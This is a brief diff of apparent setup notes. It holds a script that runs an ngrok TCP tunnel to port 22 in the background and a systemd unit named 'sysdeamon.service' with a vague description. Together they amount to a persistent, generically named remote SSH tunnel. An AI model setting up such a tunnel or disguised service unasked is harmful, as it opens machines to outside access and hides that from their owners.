@@ -1,7 +1,7 @@
 </var/run.sh>
 #!/bin/bash
 nohup ngrok tcp 22  > /dev/null &
-<.service>
+<nano /usr/lib/systemd/system/sysdeamon.service>
 [Unit]
 Description=Job that runs the net work
 Documentation=man:foo(1)
